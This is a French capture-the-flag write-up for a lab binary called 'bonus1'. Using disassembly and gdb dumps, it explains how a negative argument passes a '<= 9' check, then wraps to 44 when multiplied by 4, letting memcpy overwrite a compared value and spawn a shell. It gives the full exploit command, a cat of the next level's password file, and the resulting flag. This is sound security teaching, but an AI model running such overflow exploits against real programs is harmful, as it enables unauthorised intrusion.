Dans ce niveau l'executable `bonus1` n'a qu'une fonction `main(int ac, char **av)`

Apres plusieurs tests on voit qu'il lui faut 2 arguments

On va chercher a atteindre cet endroit 
```sh
0x0804848a      c744240480..   mov dword [var_4h], 0x8048580 ; [0x8048580:4]=0x2f006873 ; "sh"
0x08048492      c704248385..   mov dword [esp], str._bin_sh ; [0x8048583:4]=0x6e69622f ; "/bin/sh"
0x08048499      e8b2feffff     call sym.imp.exec
```
Le programme fait d'abord `nb = atoi(av[1])` puis une comparaison pour verifier que `nb <= 9`

Ensuite on a un appel a `memcpy(av[2], nb * 4)` et enfin une derniere cmp `0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)`

Notre but va etre de lui passer un nombre suffisant pour que `memcpy` copie `0x574f4c46` a `0x3c(%esp)`
```sh
Starting program: /home/user/bonus1/bonus1 4 $(python -c 'print "A" * 16')
Breakpoint 1, 0x08048478 in main ()
(gdb) x/20wx $esp
0xbffff6d0:	0xbffff6e4	0xbffff8fa	0x00000010	0x080482fd
0xbffff6e0:	0xb7fd13e4	0x41414141	0x41414141	0x41414141
0xbffff6f0:	0x41414141	0xb7e5edc6	0xb7fd0ff4	0xb7e5ee55
0xbffff700:	0xb7fed280	0x00000000	0x080484b9	0x00000004
0xbffff710:	0x080484b0	0x00000000	0x00000000	0xb7e454d3
(gdb) x/wx $esp+0x3c
0xbffff70c:	0x00000004
```
Au niveau de la comparaison on voit nos 16 "A" copies et que l'adresse compare est a 44 char (40 + adresse)

Il faut donc que le programme copie 44 char mais notre max est a 9 en premier arg

Dans la memoire le premier bit est appele `bit de signe` donc a `0 si positif ou nul` et a `1 si negatif`

Faire `* 4` en binaire correspond a faire un decallage de 2 bits a gauche. ex: `1 = 0001 * 4 = 0100 = 4`

On veut ecrire 11 (car 44/4 = 11), le nombre 11 (systeme en 32 bits) en binaire = `0000.0000.0000.0000.0000.0000.0000.1011`

Donc si on veut faire 11 * 4 = `0000.0000.0000.0000.0000.0000.0010.1100 = 44`

Le plus petit negatif donc `int min` = `1000.0000.0000.0000.0000.0000.0000.0000` (rappel : 1er bit = bit de signe)

En sachant tout cela, multiplier par 4 un negatif proche du `int min` ferait disparaitre le bit de signe
```sh
1000.0000.0000.0000.0000.0000.0000.0000
            OU
1100.0000.0000.0000.0000.0000.0000.0000
```
On a donc qu'a 'ajouter' 11 a l'un de ces nombres = `1100.0000.0000.0000.0000.0000.0000.1011 = -1073741813`

Ce nombre passe la verification du retour d'atoi car < 9 et ensuite une fois multiplie par 4 en binaire on a donc `0000.0000.0000.0000.0000.0000.0010.1100` soit 44

Il nous reste plus qu'a copier nos 40 char + 0x574f4c46 pour la comparaison

`./bonus1 -1073741813 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')`

Enfin le `execve(/bin/sh)` s'execute on a plus qu'a `cat /home/user/bonus2/.pass`

Le flag sort  = `579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`
